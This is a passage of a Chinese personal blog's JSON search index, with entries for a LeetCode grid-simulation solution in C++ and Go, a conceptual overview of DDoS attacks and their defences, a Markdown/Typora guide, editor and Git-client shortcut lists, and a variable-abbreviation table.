res&#125;","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/tags/LeetCode/"},{"name":"数据","slug":"数据","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE/"},{"name":"哈希表","slug":"哈希表","permalink":"http://example.com/tags/%E5%93%88%E5%B8%8C%E8%A1%A8/"},{"name":"矩阵","slug":"矩阵","permalink":"http://example.com/tags/%E7%9F%A9%E9%98%B5/"},{"name":"模拟","slug":"模拟","permalink":"http://example.com/tags/%E6%A8%A1%E6%8B%9F/"},{"name":"Go","slug":"Go","permalink":"http://example.com/tags/Go/"},{"name":"C/C++","slug":"C-C","permalink":"http://example.com/tags/C-C/"}],"categories":[{"name":"G_LeetCode","slug":"G-LeetCode","permalink":"http://example.com/categories/G-LeetCode/"}]},{"title":"1706. 球会落何处 - 力扣（LeetCode）","date":"2023-10-27T01:24:02.500Z","path":"G_LeetCode/1706. 球会落何处/","text":"2022_02_24 [toc] 1706. 球会落何处用一个大小为 m x n 的二维网格 grid 表示一个箱子。你有 n 颗球。箱子的顶部和底部都是开着的。 箱子中的每个单元格都有一个对角线挡板，跨过单元格的两个角，可以将球导向左侧或者右侧。 将球导向右侧的挡板跨过左上角和右下角，在网格中用 1 表示。 将球导向左侧的挡板跨过右上角和左下角，在网格中用 -1 表示。 在箱子每一列的顶端各放一颗球。每颗球都可能卡在箱子里或从底部掉出来。如果球恰好卡在两块挡板之间的 “V” 形图案，或者被一块挡导向到箱子的任意一侧边上，就会卡住。 返回一个大小为 n 的数组 answer ，其中 answer[i] 是球放在顶部的第 i 列后从底部掉出来的那一列对应的下标，如果球卡在盒子里，则返回 -1 。 示例 1： 12345678输入：grid = [[1,1,1,-1,-1],[1,1,1,-1,-1],[-1,-1,-1,1,1],[1,1,1,1,-1],[-1,-1,-1,-1,-1]]输出：[1,-1,-1,-1,-1]解释：示例如图：b0 球开始放在第 0 列上，最终从箱子底部第 1 列掉出。b1 球开始放在第 1 列上，会卡在第 2、3 列和第 1 行之间的 &quot;V&quot; 形里。b2 球开始放在第 2 列上，会卡在第 2、3 列和第 0 行之间的 &quot;V&quot; 形里。b3 球开始放在第 3 列上，会卡在第 2、3 列和第 0 行之间的 &quot;V&quot; 形里。b4 球开始放在第 4 列上，会卡在第 2、3 列和第 1 行之间的 &quot;V&quot; 形里。 示例 2： 123输入：grid = [[-1]]输出：[-1]解释：球被卡在箱子左侧边上。 示例 3： 12输入：grid = [[1,1,1,1,1,1],[-1,-1,-1,-1,-1,-1],[1,1,1,1,1,1],[-1,-1,-1,-1,-1,-1]]输出：[0,1,2,3,4,-1] 提示： m == grid.length n == grid[i].length 1 &lt;= m, n &lt;= 100 grid[i][j] 为 1 或 -1 Solution思路 我们依次判断每个球的最终位置。对于每个球，从上至下判断球位置的移动方向。在对应的位置，如果挡板向右偏，则球会往右移动；如果挡板往左偏，则球会往左移动。若移动过程中碰到侧边或者 \\text{V}V 型，则球会停止移动，卡在箱子里。如果可以完成本层的移动，则继续判断下一层的移动方向，直到落出箱子或者卡住。 作者：LeetCode-Solution链接：https://leetcode-cn.com/problems/where-will-the-ball-fall/solution/qiu-hui-luo-he-chu-by-leetcode-solution-xqop/来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 1234567891011121314151617181920class Solution &#123;public: vector&lt;int&gt; findBall(vector&lt;vector&lt;int&gt;&gt;&amp; grid) &#123; int n = grid[0].size(); //箱子的列数 vector&lt;int&gt; ans(n); for(int i = 0; i &lt; n; i++)&#123; //分别求每个球掉到底部的位置下标 int col = i; //col表示球在下降过程中的纵坐标 for(auto&amp; row : grid)&#123; //分别求出球掉到每层的位置 int dir = row[col]; //dir表示球在下降过程中向左或向右下降 col += dir; //更新球在下一层的纵坐标,向右移动(纵坐标加1)/向左移动(纵坐标减1) if(col &lt; 0 || col == n || row[col] != dir )&#123; //row[col]表示球将要移动的方向上挡板的布置情况,dir表示当前球的移动方向，两者方向不一致会形成夹角 col = -1; //当形成夹角或被挡在箱子侧边时,球将会卡在盒子里,所以该球下降的结果值直接赋值为-1; break; &#125; &#125; ans[i] = col; //col表示每个球掉落到底部的位置,即为结果值 &#125; return ans; &#125;&#125;; 123456789101112131415161718​func findBall(grid [][]int) []int &#123; n := len(grid[0]) ans := make([]int, n) for j := range ans &#123; col := j // 球的初始列 for _, row := range grid &#123; dir := row[col] col += dir // 移动球 if col &lt; 0 || col == n || row[col] != dir &#123; // 到达侧边或V型 col = -1 break &#125; &#125; ans[j] = col // col &gt;= 0 为成功到达底部 &#125; return ans&#125;","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/tags/LeetCode/"},{"name":"矩阵","slug":"矩阵","permalink":"http://example.com/tags/%E7%9F%A9%E9%98%B5/"},{"name":"模拟","slug":"模拟","permalink":"http://example.com/tags/%E6%A8%A1%E6%8B%9F/"},{"name":"Go","slug":"Go","permalink":"http://example.com/tags/Go/"},{"name":"C/C++","slug":"C-C","permalink":"http://example.com/tags/C-C/"},{"name":"数组","slug":"数组","permalink":"http://example.com/tags/%E6%95%B0%E7%BB%84/"},{"name":"深度优先搜索","slug":"深度优先搜索","permalink":"http://example.com/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"},{"name":"动态规划","slug":"动态规划","permalink":"http://example.com/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}],"categories":[{"name":"G_LeetCode","slug":"G-LeetCode","permalink":"http://example.com/categories/G-LeetCode/"}]},{"title":"【攻击】DDoS攻击","date":"2023-10-27T01:24:02.498Z","path":"F_攻防/DDoS攻击/","text":"概述：DDoS() 技术鉴赏 [toc] DDoS说明 DDoS(Distributed Denial of Service)即分布式拒绝服务攻击,是一种通过大量占用目标服务器资源的方式,使服务暂时中断或停止,无法对正常用户提供服务的攻击手段。 DDoS攻击的主要特征包括: 分布式 - 利用大量分布在不同地点的攻击源进行攻击。 流量泛滥 - 通过发送大量流量淹没目标服务器的带宽或资源。常见的有UDP flood、ICMP flood等。 资源耗尽 - 占用目标服务器的关键系统资源,如连接数、线程数等。如SYN flood攻击。 攻击增强 - 通过各种方式增强攻击流量和效果。如IP地址欺骗。 多向量组合 - 综合使用各种类型的攻击手段,对目标发起多维攻击。 防御DDoS攻击的主要手段包括: 增加带宽 - 提高流量承载能力。 使用DDoS防护服务 - 由服务提供商过滤攻击流量。 限制连接和请求 - 加强对高流量源的访问控制。 丢弃无效流量 - 通过技术手段识别并丢弃攻击流量。 扩展关键系统资源 - 提高关键资源池容量。 服务降级 - 在被攻击时暂时停止非核心服务。 服务分散 - 通过CDN等方式分散服务,避免单点故障。 合理限速 - 对源IP访问频率和流量进行控制。 DDoS防御需要综合运用各种技术手段,从网络、服务和应用层进行防护,最大程度减轻攻击影响。","tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"DDoS","slug":"DDoS","permalink":"http://example.com/tags/DDoS/"}],"categories":[{"name":"F_攻防","slug":"F-攻防","permalink":"http://example.com/categories/F-%E6%94%BB%E9%98%B2/"}]},{"title":"Linux 命令脚本","date":"2023-10-27T01:24:02.497Z","path":"E_手册/脚本/linux命令相关脚本整理/","text":"[toc] ll + awk 获取文件markdown链接1ll | awk &#x27;&#123;print &quot;[&quot;$9&quot;](./&quot;$9&quot;readme.md)&quot;&#125;&#x27;","tags":[],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"脚本","slug":"E-手册/脚本","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E8%84%9A%E6%9C%AC/"}]},{"title":"Markdown手册","date":"2023-10-27T01:24:02.495Z","path":"E_手册/所见即所得_Typora及用法/","text":"Markdown介绍Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。 Markdown语法的目标是：成为一种适用于网络的书写语言「易读易写」。并且Markdown兼容HTML。你可以使用HTML语言编写Markdown，如果你要部署你的个人博客，那这更是你必不可少的技能之一！！！ 强烈推荐typora这款markdown软件，谁用谁说好！ 一款优质的Markdown编辑器,不仅仅是Markdown 除此之外，如果你愿意花一点点时间来了解{ post_link } 简述Markdown常见用法在下面，我将简单介绍几个常用的markdown写法。希望大家写出更好的观看效果的文章。本文一些内容是属于Hexo下buttrerfly主题的内置标签。 大家可以自己下载Typora尝试一下markdown。 为什么推荐Typora,我归纳了以下几点： 一 “所见即所得”（即时渲染） 二 支持图床功能，配合PicGO可以实现图片的随用随传 如下所示，右击图片就可以上传到PicGo指定的图床。真的很好用！！！ 三 Typora还支持将md文件导出为多种格式的文件，目前支持以下文件: 四 如果你还会一点CSS,那你甚至可以自定义界面样式 下面我将从以下这几个方面介绍一下Typora的一些使用方法： 字体 （&lt;small&gt;小&lt;/small&gt; &lt;big&gt;大&lt;/big&gt;） 斜体 *斜体* 粗体 **粗体** 斜体 + 粗体 ***斜体+粗体\\*** 删除 ~~原价：99.9元~~ 链接 [http://www.jianshu.com](https://www.jianshu.com) 分割线 下划线 标题 任务列表 图片 区块引用 行内代码 `markdown` 列表 表格 脚注 高亮 字体 123&lt;small&gt;小号字体&lt;/small&gt;&lt;big&gt;大号字体&lt;/big&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;font color=rgb(25,26,35) face=&quot;华文彩云&quot; size=100px style=&quot;text-align:center&quot;&gt;其他快捷方式&lt;/font&gt;&lt;/div&gt; 属性 值 描述 color rgb();#XXXXXXcolorname 规定文本的颜色，可以使用style代替 face font_family 规定文本的字体 size number 规定文本的大小 小号字体 大号字体 其他快捷方式 斜体西方斜体这一习惯看个人喜好吧。在文字前后各加一个*就👌了 1*斜体* 效果如下：斜体 加粗在文字前后各加两个**就👌了 1**加粗** 效果如下： 加粗 斜体加粗斜体文字前后各加*，加粗文字前后各加**，斜体加粗在文字前后加***。没毛病… 1***斜体加粗*** 效果如下: 斜体加粗 删除1~~content~~ 效果如下：content 链接链接应该是使用最多的场景了。他人有好的文字或者自己摘自哪里、都可以传送门直接过去。 12[网站名](地址)地址 效果如下：example@163.comhttp://www.baidu.com 分割线12341 ****2 *****3 ---以上三种写法都可以，效果一样，看个人心情使用。 下划线1&lt;u&gt;内容&lt;/u&gt; 内容 标题123# 一级标题···###### 六级标题 //最多支持六级标题 效果如下： 一级标题 六级标题 任务列表格式： 12 - [] 待完成- [X] 已完成 效果如下： 待完成 已完成 图片格式为![]() 其中图片名称可以为空。直接输入[]就可以。下面我的url输入的直接就文字url。所以肯定是空图片啦。Typora也可以直接把电脑本地的图片拖进来，自动生成图片链接。 1![图片名](URL) 区块引用代码块，使用’`‘和~都可以 123```代码``` 效果如下： 1代码 行内代码程序猿引用代码，或者是文章中有一些关键性的名词啊，或者为了突出醒目。效果不错。 1`printf(&quot;test&quot;)` 效果如下： printf(&quot;test”); 列表1234567- 无序项目1* 无序项目2+ 无序项目3 - 无序二级1 - 无序二级21. 有序标题 1. 无序二级标题 无序项目1 无序项目2 无序项目3 无序二级1 无序二级2 有序标题 无序二级标题 表格ctrl+t更方便 1234| 第一格表头 | 第二格表头 || -------------------------------- | ---------------------- || 内容单元格 第一列第一格 | 内容单元格第二列第一格 || 内容单元格 第一列第二格 多加文字 | 内容单元格第二列第二格 | 效果如下: 第一格表头 第二格表头 内容单元格 第一列第一格 内容单元格第二列第一格 内容单元格 第一列第二格 多加文字 内容单元格第二列第二格 脚注H~2~o效果预览–&gt;H2o 高亮&lt;mark&gt;1&lt;mark&gt;content&lt;/mark&gt; &lt;mark&gt;标签支持全局属性，因此可以通过自定义style修改mark的样式。 参考这个↓： HTML参考手册|编程字典 12&lt;mark&gt;原始样式&lt;/mark&gt;&lt;mark style=&quot;font:&#x27;微软雅黑&#x27;;color:red;font-weight:900&quot;&gt;CSS样式&lt;/mark&gt; 原始样式CSS样式","tags":[],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"Visual Assist 快捷键整理","date":"2023-10-27T01:24:02.494Z","path":"E_手册/快捷键整理/Visual Assist 快捷键/","text":"Visual Assist 快捷键： shift+alt+F 查找引用alt+M 查看当前文件下函数列表alt+up 将当前行的代码放到上一行alt+down 将当前行的代码放到下一行alt+O .h&#x2F;.cpp文件的切换Ctrl + -：光标回到上一处Ctrl + Shift + -：光标回到下一处Alt + G：快速跳到定义 shift+alt+O 打开解决方案文件对话框shift+alt+S 查找某个对象或是变量shift+alt+Q 鼠标定位到函数名上，若是在cpp文件中，则按此快捷键会弹出右键菜单，里面有一个选项–创建声明。 与Alt+O配合会比较方便。shift+alt+F 找到对象的所有引用shift+alt+R 找到所有对象并重命名","tags":[{"name":"快捷键","slug":"快捷键","permalink":"http://example.com/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"name":"VA","slug":"VA","permalink":"http://example.com/tags/VA/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"快捷键整理","slug":"E-手册/快捷键整理","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%95%B4%E7%90%86/"}]},{"title":"Fork快捷键整理","date":"2023-10-27T01:24:02.493Z","path":"E_手册/快捷键整理/Fork/","text":"[toc] Fork 快捷键General Navigation Ctrl1 - Show Changes view (second press will focus commit field) Ctrl2 - Show All Commits view (second press will jump to HEAD) Ctrl0 - Reveal HEAD CtrlP - Show Quick Launch window CtrlTab - Select next tab CtrlShiftTab - Select previous tab CtrlT - Open new tab CtrlW - Close current tab Ctrl&#x3D;&#x2F;Ctrl- Zoom in&#x2F; Zoom out Ctrl, - Open Fork preferences All Commits View Ctrl0 - Jump to HEAD CtrlF - Commit search Enter, F3 - Jump to next search result ShiftEnter, ShiftF3 - Jump to previous search result CtrlC - Copy commit info Delete - Remove branch&#x2F;stash CtrlShiftA - Filter by active branch Changes View CtrlEnter - Commit CtrlShiftEnter - Commit and push Ctrl1 - Focus commit message field CtrlF - Filter Enter, CtrlShiftS - Stage&#x2F;unstage selected file (or lines) CtrlAltShiftS - Stage&#x2F;unstage all files Backspace, CtrlShiftD - Discard selected file (or lines) CtrlO - Open selected file CtrlD - Open selected file in external diff tool CtrlC - Copy selected file full path Repository F5 - Refresh CtrlShiftN - Init new repository CtrlN - Clone new repository CtrlO - Open repository CtrlShiftF - Fetch CtrlAltShiftF (Ctrl + click on button) - Quick Fetch CtrlShiftL - Pull CtrlAltShiftL (Ctrl + click on button) - Quick Pull CtrlShiftP - Push CtrlAltShiftP (Ctrl + click on button) - Quick Push CtrlShiftB - New branch CtrlShiftT - New tag CtrlShiftH - Create stash CtrlAltO - Open in File Explorer CtrlAltT - Open in Terminal Repository Manager F2 - Rename Repository Delete - Remove Repository Enter - Open Repository","tags":[{"name":"快捷键","slug":"快捷键","permalink":"http://example.com/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"快捷键整理","slug":"E-手册/快捷键整理","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%95%B4%E7%90%86/"}]},{"title":"常用变量名缩写","date":"2023-10-27T01:24:02.491Z","path":"E_手册/常用变量名缩写/","text":"变量名 缩写 addition add address addr administrator adm answer ans application app arguments args array arr assemble asm asynchronization asyn attribute attr authority&#x2F;authorize auth average avg begin beg bitmap bmp break brk buffer buf&#x2F;buff button btn calculate calc calendar cal character char click clk clock clk color clr column col command cmd compare cmp config conf configuration cfg container cntr control ctrl coordinates coord copy cpy count cnt current cur cylinder cyl database db debug dbg decrease dec default def define def delete del department dept dependency&#x2F;dependent&#x2F;depends dep destination dst&#x2F;dest develop dev device dev dialog dlg dictionary dict display disp division div document doc double dbl driver drv duplicate&#x2F;duplication dup educate&#x2F;education edu equal&#x2F;equality&#x2F;equivalence&#x2F;equivalent eq error err escape esc execute exec extend ext float flt frame frm frequency freq function func government gov group grp hexadecimal hex horizontal horz image img implement impl increment inc index idx individual indv information info initialize init insert ins instance ins interrupt intr iterator it lable lbl length len library lib link lnk list lst maximum max memory mem message msg middle mid minimum min multiplication mul navigation nav negative neg number num object obj offset ofs operator opr optimization opt organization org original orig 变量名 缩写 package pkg parameter param password pwd picture pic point pt pointer ptr position pos positive pos previous pre print prn program prg properties props public pub receive&#x2F;received recv record rec reference ref register reg request req resource res result res response rsp return ret screen scr second sec segment seg select sel semaphore sem sequence seq server srv signal sig source src stack stk standard std statistic stat status stat storage stg string str student stu subtraction sub summation&#x2F;summary sum synchronize sync system sys table tbl temporary tmp&#x2F;temp test tst text txt time stamp ts total tot translate trans update upd upgrade upg unknown unk user usr utility util value val variable var version ver vertical vert window win thread thrd","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"变量","slug":"变量","permalink":"http://example.com/tags/%E5%8F%98%E9%87%8F/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"写作协作手册","date":"2023-10-27T01:24:02.491Z","path":"E_手册/写作样式/","text":"[toc] 暂时我不想知道你在想什么！ 你想知道什么？ 123456#include&lt;iostream&gt;using namespace std;int main(int argc,const char *argv[])&#123; cout &lt;&lt; &quot;Hello World&quot;; return 0;&#125; 常用颜色代码color=maroon color=grey color=silver color=lightgrey color=HotPink color=DeepPink color=VioletRed color=Purple color=navy color=Blue color=DeepSkyBlue color=LightSkyBlue color=aqua color=DarkTurquoise color=LightSeaGreen color=YellowGreen color=GreenYellow color=Yellow color=Tomato color=red color=fuchsia color=MediumOrchid color=DarkViolet https://img.shields.io/badge/个人主页-fole_del.github.io-blue 常用模板（复杂度） ?style=plastic&amp;logo=appveyor ?style=flat&amp;logo=appveyor ?style=flat-square&amp;logo=appveyor ?style=for-the-badge&amp;logo=appveyor ?style=social&amp;logo=appveyor 其他快捷方式^_^ &#x2F;* default *&#x2F; default &#x2F;* success *&#x2F; success &#x2F;* primary *&#x2F; primary &#x2F;* info *&#x2F; info &#x2F;* warning *&#x2F; warning &#x2F;* danger *&#x2F; danger 动画 需要注意的是在使用时需要添加fas的属性，如&lt;span class=&quot;fas faa-wrench animated&quot;&gt;&lt;/span&gt; 小康博客 On DOM load On hover On parent hover faa-wrench animated faa-wrench animated-hover faa-wrench faa-ring animated faa-ring animated-hover faa-ring faa-horizontal animated faa-horizontal animated-hover faa-horizontal faa-vertical animated faa-vertical animated-hover faa-vertical faa-flash animated faa-flash animated-hover faa-flash faa-bounce animated faa-bounce animated-hover faa-bounce faa-spin animated faa-spin animated-hover faa-spin faa-float animated faa-float animated-hover faa-float faa-pulse animated faa-pulse animated-hover faa-pulse faa-shake animated faa-shake animated-hover faa-shake faa-tada animated faa-tada animated-hover faa-tada faa-passing animated faa-passing animated-hover faa-passing faa-passing-reverse animated faa-passing-reverse animated-hover faa-passing-reverse faa-burst animated faa-burst animated-hover faa-burst faa-falling animated faa-falling animated-hover faa-falling faa-rising animated faa-rising animated-hover faa-rising 外挂标签checkbox1234567891011121314151617&#123;% checkbox 纯文本测试 %&#125;&#123;% checkbox checked, 支持简单的 [markdown](https://guides.github.com/features/mastering-markdown/) 语法 %&#125;&#123;% checkbox red, 支持自定义颜色 %&#125;&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;&#123;% checkbox plus green checked, 增加 %&#125;&#123;% checkbox minus yellow checked, 减少 %&#125;&#123;% checkbox times red checked, 叉 %&#125;&#123;% radio 纯文本测试 %&#125;&#123;% radio checked, 支持简单的 [markdown](https://guides.github.com/features/mastering-markdown/) 语法 %&#125;&#123;% radio red, 支持自定义颜色 %&#125;&#123;% radio green, 绿色 %&#125;&#123;% radio yellow, 黄色 %&#125;&#123;% radio cyan, 青色 %&#125;&#123;% radio blue, 蓝色 %&#125; 所有表情:a: :ab: :abc: :abcd: :accept: :aerial_tramway: :afghanistan: :airplane: :central_african_republic: :earth_africa: :south_africa: :aland_islands: :alarm_clock: :alembic: 😄 :smile: 😆 :laughing: 😊 :blush: 😃 :smiley: ☺️ :relaxed: 😏 :smirk: 😍 :heart_eyes: 😘 :kissing_heart: 😚 :kissing_closed_eyes: 😳 :flushed: 😌 :relieved: 😆 :satisfied: 😁 :grin: 😉 :wink: 😜 :stuck_out_tongue_winking_eye: 😝 :stuck_out_tongue_closed_eyes: 😀 :grinning: 😗 :kissing: 😙 :kissing_smiling_eyes: 😛 :stuck_out_tongue: 😴 :sleeping: 😟 :worried: 😦 :frowning: 😧 :anguished: 😮 :open_mouth: 😬 :grimacing: 😕 :confused: 😯 :hushed: 😑 :expressionless: 😒 :unamused: 😅 :sweat_smile: 😓 :sweat: 😥 :disappointed_relieved: 😩 :weary: 😔 :pensive: 😞 :disappointed: 😖 :confounded: 😨 :fearful: 😰 :cold_sweat: 😣 :persevere: 😢 :cry: 😭 :sob: 😂 :joy: 😲 :astonished: 😱 :scream: 😫 :tired_face: 😠 :angry: 😡 :rage: 😤 :triumph: 😪 :sleepy: 😋 :yum: 😷 :mask: 😎 :sunglasses: 😵 :dizzy_face: 👿 :imp: 😈 :smiling_imp: 😐 :neutral_face: 😶 :no_mouth: 😇 :innocent: 👽 :alien: 💛 :yellow_heart: 💙 :blue_heart: 💜 :purple_heart: ❤️ :heart: 💚 :green_heart: 💔 :broken_heart: 💓 :heartbeat: 💗 :heartpulse: 💕 :two_hearts: 💞 :revolving_hearts: 💘 :cupid: 💖 :sparkling_heart: ✨ :sparkles: ⭐️ :star: 🌟 :star2: 💫 :dizzy: 💥 :boom: 💥 :collision: 💢 :anger: ❗️ :exclamation: ❓ :question: ❕ :grey_exclamation: ❔ :grey_question: 💤 :zzz: 💨 :dash: 💦 :sweat_drops: 🎶 :notes: 🎵 :musical_note: 🔥 :fire: 💩 :hankey: 💩 :poop: 💩 :shit: 👍 :+1: 👍 :thumbsup: 👎 :-1: 👎 :thumbsdown: 👌 :ok_hand: 👊 :punch: 👊 :facepunch: ✊ :fist: ✌️ :v: 👋 :wave: ✋ :hand: ✋ :raised_hand: 👐 :open_hands: ☝️ :point_up: 👇 :point_down: 👈 :point_left: 👉 :point_right: 🙌 :raised_hands: 🙏 :pray: 👆 :point_up_2: 👏 :clap: 💪 :muscle: 🤘 :metal: 🖕 :fu: 🚶 :walking: 🏃 :runner: 🏃 :running: 👫 :couple: 👪 :family: 👬 :two_men_holding_hands: 👭 :two_women_holding_hands: 💃 :dancer: 👯 :dancers: 🙆 :ok_woman: 🙅 :no_good: 💁 :information_desk_person: 🙋 :raising_hand: 👰 :bride_with_veil: 🙎 :person_with_pouting_face: 🙍 :person_frowning: 🙇 :bow: :couplekiss: :couplekiss: 💑 :couple_with_heart: 💆 :massage: 💇 :haircut: 💅 :nail_care: 👦 :boy: 👧 :girl: 👩 :woman: 👨 :man: 👶 :baby: 👵 :older_woman: 👴 :older_man: 👱 :person_with_blond_hair: 👲 :man_with_gua_pi_mao: 👳 :man_with_turban: 👷 :construction_worker: 👮 :cop: 👼 :angel: 👸 :princess: 😺 :smiley_cat: 😸 :smile_cat: 😻 :heart_eyes_cat: 😽 :kissing_cat: 😼 :smirk_cat: 🙀 :scream_cat: 😿 :crying_cat_face: 😹 :joy_cat: 😾 :pouting_cat: 👹 :japanese_ogre: 👺 :japanese_goblin: 🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil: 💂 :guardsman: 💀 :skull: 🐾 :feet: 👄 :lips: 💋 :kiss: 💧 :droplet: 👂 :ear: 👀 :eyes: 👃 :nose: 👅 :tongue: 💌 :love_letter: 👤 :bust_in_silhouette: 👥 :busts_in_silhouette: 💬 :speech_balloon: 💭 :thought_balloon: Nature ☀️ :sunny: ☔️ :umbrella: ☁️ :cloud: ❄️ :snowflake: ⛄️ :snowman: ⚡️ :zap: 🌀 :cyclone: 🌁 :foggy: 🌊 :ocean: 🐱 :cat: 🐶 :dog: 🐭 :mouse: 🐹 :hamster: 🐰 :rabbit: 🐺 :wolf: 🐸 :frog: 🐯 :tiger: 🐨 :koala: 🐻 :bear: 🐷 :pig: 🐽 :pig_nose: 🐮 :cow: 🐗 :boar: 🐵 :monkey_face: 🐒 :monkey: 🐴 :horse: 🐎 :racehorse: 🐫 :camel: 🐑 :sheep: 🐘 :elephant: 🐼 :panda_face: 🐍 :snake: 🐦 :bird: 🐤 :baby_chick: 🐥 :hatched_chick: 🐣 :hatching_chick: 🐔 :chicken: 🐧 :penguin: 🐢 :turtle: 🐛 :bug: 🐝 :honeybee: 🐜 :ant: 🐞 :beetle: 🐌 :snail: 🐙 :octopus: 🐠 :tropical_fish: 🐟 :fish: 🐳 :whale: 🐋 :whale2: 🐬 :dolphin: 🐄 :cow2: 🐏 :ram: 🐀 :rat: 🐃 :water_buffalo: 🐅 :tiger2: 🐇 :rabbit2: 🐉 :dragon: 🐐 :goat: 🐓 :rooster: 🐕 :dog2: 🐖 :pig2: 🐁 :mouse2: 🐂 :ox: 🐲 :dragon_face: 🐡 :blowfish: 🐊 :crocodile: 🐪 :dromedary_camel: 🐆 :leopard: 🐈 :cat2: 🐩 :poodle: 🐾 :paw_prints: 💐 :bouquet: 🌸 :cherry_blossom: 🌷 :tulip: 🍀 :four_leaf_clover: 🌹 :rose: 🌻 :sunflower: 🌺 :hibiscus: 🍁 :maple_leaf: 🍃 :leaves: 🍂 :fallen_leaf: 🌿 :herb: 🍄 :mushroom: 🌵 :cactus: 🌴 :palm_tree: 🌲 :evergreen_tree: 🌳 :deciduous_tree: 🌰 :chestnut: 🌱 :seedling: 🌼 :blossom: 🌾 :ear_of_rice: 🐚 :shell: 🌐 :globe_with_meridians: 🌞 :sun_with_face: 🌝 :full_moon_with_face: 🌚 :new_moon_with_face: 🌑 :new_moon: 🌒 :waxing_crescent_moon: 🌓 :first_quarter_moon: 🌔 :waxing_gibbous_moon: 🌕 :full_moon: 🌖 :waning_gibbous_moon: 🌗 :last_quarter_moon: 🌘 :waning_crescent_moon: 🌜 :last_quarter_moon_with_face: 🌛 :first_quarter_moon_with_face: 🌔 :moon: 🌍 :earth_africa: 🌎 :earth_americas: 🌏 :earth_asia: 🌋 :volcano: 🌌 :milky_way: ⛅️ :partly_sunny: Objects 🎍 :bamboo: 💝 :gift_heart: 🎎 :dolls: 🎒 :school_satchel: 🎓 :mortar_board: 🎏 :flags: 🎆 :fireworks: 🎇 :sparkler: 🎐 :wind_chime: 🎑 :rice_scene: 🎃 :jack_o_lantern: 👻 :ghost: 🎅 :santa: 🎄 :christmas_tree: 🎁 :gift: 🔔 :bell: 🔕 :no_bell: 🎋 :tanabata_tree: 🎉 :tada: 🎊 :confetti_ball: 🎈 :balloon: 🔮 :crystal_ball: 💿 :cd: 📀 :dvd: 💾 :floppy_disk: 📷 :camera: 📹 :video_camera: 🎥 :movie_camera: 💻 :computer: 📺 :tv: 📱 :iphone: ☎️ :phone: ☎️ :telephone: 📞 :telephone_receiver: 📟 :pager: 📠 :fax: 💽 :minidisc: 📼 :vhs: 🔉 :sound: 🔈 :speaker: 🔇 :mute: 📢 :loudspeaker: 📣 :mega: ⌛️ :hourglass: ⏳ :hourglass_flowing_sand: ⏰ :alarm_clock: ⌚️ :watch: 📻 :radio: 📡 :satellite: ➿ :loop: 🔍 :mag: 🔎 :mag_right: 🔓 :unlock: 🔒 :lock: 🔏 :lock_with_ink_pen: 🔐 :closed_lock_with_key: 🔑 :key: 💡 :bulb: 🔦 :flashlight: 🔆 :high_brightness: 🔅 :low_brightness: 🔌 :electric_plug: 🔋 :battery: 📲 :calling: ✉️ :email: 📫 :mailbox: 📮 :postbox: 🛀 :bath: 🛁 :bathtub: 🚿 :shower: 🚽 :toilet: 🔧 :wrench: 🔩 :nut_and_bolt: 🔨 :hammer: 💺 :seat: 💰 :moneybag: 💴 :yen: 💵 :dollar: 💷 :pound: 💶 :euro: 💳 :credit_card: 💸 :money_with_wings: 📧 :e-mail: 📥 :inbox_tray: 📤 :outbox_tray: ✉️ :envelope: 📨 :incoming_envelope: 📯 :postal_horn: 📪 :mailbox_closed: 📬 :mailbox_with_mail: 📭 :mailbox_with_no_mail: 🚪 :door: 🚬 :smoking: 💣 :bomb: 🔫 :gun: 🔪 :hocho: 💊 :pill: 💉 :syringe: 📄 :page_facing_up: 📃 :page_with_curl: 📑 :bookmark_tabs: 📊 :bar_chart: 📈 :chart_with_upwards_trend: 📉 :chart_with_downwards_trend: 📜 :scroll: 📋 :clipboard: 📆 :calendar: 📅 :date: 📇 :card_index: 📁 :file_folder: 📂 :open_file_folder: ✂️ :scissors: 📌 :pushpin: 📎 :paperclip: ✒️ :black_nib: ✏️ :pencil2: 📏 :straight_ruler: 📐 :triangular_ruler: 📕 :closed_book: 📗 :green_book: 📘 :blue_book: 📙 :orange_book: 📓 :notebook: 📔 :notebook_with_decorative_cover: 📒 :ledger: 📚 :books: 🔖 :bookmark: 📛 :name_badge: 🔬 :microscope: 🔭 :telescope: 📰 :newspaper: 🏈 :football: 🏀 :basketball: ⚽️ :soccer: ⚾️ :baseball: 🎾 :tennis: 🎱 :8ball: 🏉 :rugby_football: 🎳 :bowling: ⛳️ :golf: 🚵 :mountain_bicyclist: 🚴 :bicyclist: 🏇 